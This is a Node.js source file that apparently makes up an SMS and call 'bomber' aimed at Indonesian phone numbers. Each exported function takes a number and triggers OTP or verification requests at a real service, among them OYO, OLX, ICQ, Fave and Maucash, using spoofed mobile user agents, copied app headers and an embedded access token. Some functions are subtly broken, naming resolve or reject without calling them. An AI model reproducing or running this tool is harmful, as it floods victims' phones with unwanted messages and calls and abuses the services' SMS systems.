const axios = require("axios")

module.exports.call_nutriclub = async (no) => {
  return new Promise((resolve, reject) => {
    let hd = {'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}

    axios("https://www.nutriclub.co.id/otp/?phone=0"+no+"&old_phone=0"+no, {
        method: 'POST',
        headers: hd
    })
      .then(async ({data}) => {
        resolve(data)
      })
      .catch((e) => {
        reject(e.message)
      })
  })
}
       
module.exports.sms_oyo = async (no) => {
  return new Promise((resolve, reject) => {
    let hd = {
      "Host": "identity-gateway.oyorooms.com",
      "consumer_host": "https://www.oyorooms.com",
      "accept-language": "id",
      "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
      "Content-Type": "application/json",
      "accept": "*/*",
      "origin": "https://www.oyorooms.com",
      "referer": "https://www.oyorooms.com/login",
      "Accept-Encoding": "gzip, deflate, br",
    }
    
    let config = {"phone":no,"country_code":"+62","country_iso_code":"ID","nod":"4","send_otp":"true","devise_role":"Consumer_Guest"}
    
    axios("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", {
        method: 'POST',
        data: JSON.stringify(config),
        headers: hd
    })
      .then(async ({data}) => {
        if(data.otp_sent){
          resolve("success")
        }else{
          reject("error")
        }
      })
      .catch((e) => {
        reject("error: ", e.message)
      })
  })
}

module.exports.sms_mapclub = async (no) => {
  return new Promise((resolve, reject) => {
    let hd = {
      "Connection": "keep-alive",
      "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
      }
    
    let config = {'account': no}
    
    axios("https://beryllium.mapclub.com/api/member/registration/sms/otp", {
        method: 'POST',
        data: config,
        headers: hd
    })
      .then(async ({data}) => {
        if(data.success){
          resolve
        }else{
          reject
        }
      })
      .catch((e) => {
        console.log("error: ", e.message)
      })
  })
}

module.exports.sms_icq = async (no) => {
  return new Promise((resolve, reject) => {
    let hd = {
      "accept": "*/*",
      "accept-language": "en-US,en;q=0.9,id;q=0.8,mt;q=0.7",
      "content-type": "application/json",
      "origin": "http://web.icq.com",
      "referer": "http://web.icq.com/",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "cross-site",
      "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    }
  
  let config = JSON.stringify({"reqId":"64708-1593781791","params":{"phone":"62"+no,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
  
  axios("https://u.icq.net/api/v14/rapi/auth/sendCode", {
      method: 'POST',
      data: config,
      headers: hd
  })
    .then(async ({data}) => {
      if(data.status.code == 20000){
        resolve
      }else{
        reject
      }
    })
    .catch((e) => {
      reject(e.message)
    })
  })
}

module.exports.sms_fave = async (no) => {
  return new Promise((resolve, reject) => {
    let hd = {
      "Host": "api.myfave.com",
      "Connection": "keep-alive",
      "x-user-agent": "Fave-PWA/v1.0.0",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
      "content-type": "application/json",
      "Accept": "*/*",
      "Origin": "https://m.myfave.com",
      "Referer": "https://m.myfave.com/jakarta/auth",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
      }
    
    let config = JSON.stringify({'phone':'62'+no})
    
    axios("https://api.myfave.com/api/fave/v3/auth", {
        method: 'POST',
        data: config,
        headers: hd
    })
      .then(async ({data}) => {
        if(data.request_id){
          resolve
        }else{
          reject
        }
      })
      .catch((e) => {
        reject(e.message)
      })
  })
}

module.exports.sms_kredinesia = async (no) => {
  return new Promise((resolve, reject) => {
    let hd = {
      'user-agent':'okhttp/3.11.0',
      'content-type':'application/json; charset=UTF-8','channel-key':'GOOGLEPLAY'
    }

    let config = JSON.stringify({"code":0,"distinctId":"df857a37-421b-4a4f-ac61-6ed0e272537b","frequency":0,"phone":no})
    
    axios("https://api.kartuserba.com/appserver/v1/login/verificationCode", {
        method: 'POST',
        data: config,
        headers: hd
    })
      .then(async ({data}) => {
        resolve(data)
      })
      .catch((e) => {
        reject(e.message)
      })
  })
}

module.exports.call_jagreward = async (no) => {
  return new Promise((resolve, reject) => {
    let hd = {'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}

    axios("https://id.jagreward.com/member/verify-mobile/"+no, {
        method: 'GET',
        headers: hd
    })
      .then(async ({data}) => {
        resolve(data)
      })
      .catch((e) => {
        reject(e.message)
      })
  })
}

module.exports.sms_olx = async (no) => {
  return new Promise((resolve, reject) => {
    let hd = {"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}

    let config = JSON.stringify({"grantType": "retry","method": "sms","phone":"62"+no,"language": "id"})
    
    axios("https://www.olx.co.id/api/auth/authenticate", {
        method: 'POST',
        headers: hd,
        data: config
    })
      .then(async ({data}) => {
        resolve(data)
      })
      .catch((e) => {
        reject(e.message)
      })
  })
}

module.exports.sms_maucash = async (no) => {
  return new Promise((resolve, reject) => {
    let hd = {"Host":"japi.maucash.id","accept":"application/json, text/plain, */*","x-origin":"google play","x-org-id":"1","x-product-code":"YN-MAUCASH","x-app-version":"2.4.23","x-source-id":"android","accept-encoding":"gzip","user-agent":"okhttp/3.12.1"}

    let config = JSON.stringify({"grantType": "retry","method": "sms","phone":"62"+no,"language": "id"})
    
    axios("https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile="+no, {
        method: 'GET',
        headers: hd,
        // data: config
    })
      .then(async ({data}) => {
        resolve(data)
      })
      .catch((e) => {
        reject(e.message)
      })
  })
}

module.exports.smscall_random = async (no) => {
  return new Promise((resolve, reject) => {
    let hd = {
      "Connection": "keep-alive",
      "Accept": "*/*",
      "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }

    let config = JSON.stringify({
      "phone": "+62"+no
      })
    
    axios("https://api-bruh-bot.elpanajose.repl.co/sms", {
        method: 'POST',
        headers: hd,
        data: config
    })
      .then(async ({data}) => {
        resolve(data)
      })
      .catch((e) => {
        reject(e.message)
      })
  })
}